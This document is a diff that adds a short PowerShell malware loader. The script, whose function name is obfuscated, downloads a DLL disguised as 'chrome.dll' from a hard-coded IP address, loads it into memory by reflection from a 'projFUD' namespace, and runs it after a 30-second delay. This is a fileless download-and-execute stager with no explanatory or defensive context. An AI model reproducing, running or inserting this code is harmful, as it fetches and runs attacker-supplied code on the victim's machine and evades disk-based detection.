@@ -1,0 +1,9 @@
+Function FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
+{
+$wc = New-Object System.Net.WebClient
+$Cli555 = $wc.DownloadData("http://45.147.230.71:8080/chrome.dll")
+
+[Reflection.Assembly]::Load($Cli555).GetType('projFUD.PA').GetMethod('Execute').Invoke($null,$null)
+}
+Start-Sleep -S 30 
+IEX FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
